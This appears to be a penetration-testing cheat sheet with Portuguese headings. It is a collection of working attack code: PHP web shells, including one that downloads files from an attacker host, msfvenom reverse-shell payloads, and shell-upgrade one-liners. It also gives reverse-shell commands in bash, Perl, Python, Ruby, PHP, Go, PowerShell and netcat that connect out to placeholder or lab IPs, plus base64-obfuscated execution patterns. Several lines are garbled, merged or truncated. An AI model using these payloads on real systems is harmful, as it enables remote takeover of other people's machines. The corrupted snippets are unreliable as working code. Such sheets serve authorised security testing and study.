---
tags:
  - WEB
  - Pentest
---
# Com PHP
```php
<?php system($_GET["cmd"]); ?>

<?php echo shell_exec($_GET["cmd"]); ?>
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <victim_ip> 3333 >/tmp/f');?>

<?php exec(base64_decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTxhdHRhY2tl'?>

#Secure, simple PHP shell to load and execute code;
if (isset($_REQUEST['fupload'])) { file_put_contents($_REQUEST['fupload'], file_get_contents("http://<attacker_ip>:8000/" . $_REQUEST['fupload'])); }; 

if (isset($_REQUEST['fexec'])) { echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>"; }; 

#Start the listener on the attacker machine; 
nc -lvp 1234 

#Call the script and get the shell
http://10.10.10.9/catch.php?fexec=nc.exe <attacker_ip> 1234 -e cmd.exe``

```

# Com Msfvenom
```shell
##Listing payloads (spesific);
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}' .exe;

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe > asd.exe .aspx 

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f aspx > asd.aspx .jsp

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f raw > asd.jsp .war 

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f war > shell.war
```

# Upgrade Shell simples


```shell
#### com bash
/bin/bash -i 
#com sh;
/bin/sh -

#com echo; 
echo 'os.system('/bin/bash')' 

##com python; 
python -c 'import pty; pty.spawn("/bin/bash")' 
python -c 'import pty; pty.spawn("/bin/sh")' 

##com mawk; 
mawk 'BEGIN {system("/bin/sh")}' 

##With perl; 
perl —e 'exec "/bin/sh";' 
```
# Gerar shell 
```shell
curl https://reverse-shell.sh/10.10.15.50:9999 >> shell
```

# Tools
- https://github.com/ShutdownRepo/shellerator
- https://github.com/0x00-0x00/ShellPop
- https://github.com/cybervaca/ShellReverse
- https://liftoff.github.io/pyminifier/
- https://github.com/xct/xc/https://weibell.githuReversingshell3shell-generator/
- https://github.com/phra/PEzor

# Linux
## Bash 

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f nc -e /bin/sh 10.11.1.111 4443 

bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1 
#!/bin/bash 
bash -c "bash -i >& /dev/tcp/10.8.22.92/7777 0>&1" 
```
## Bash B64 Ofuscated 
```shell
{echo,COMMAND_BASE64}|{base64,-d}|bash echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} echo COMMAND_BASE64 | base64 -d | bash
```
# Perl
```perl
perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```
# Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' python -c 'import('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\
```
## Python IPv6
```python
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os. os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");
```
# Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
# PHP
```php
/usr/share/webshells/php/php-reverse-shell.php http://pentestmonkey.net/tools/web-shells/php-reverse-shell php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");' $sock, 1=>$sock, 2=>$sock), $pipes);?>
```
# Golang
```go
Reversing shell4echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

# Powershell

```powershell
$callback = New-Object System.Net.Sockets.TCPClient("IP ADDRESS",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close() powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# Netcat 
```shell
nc -e cmd.exe 10.11.1.111 4443
```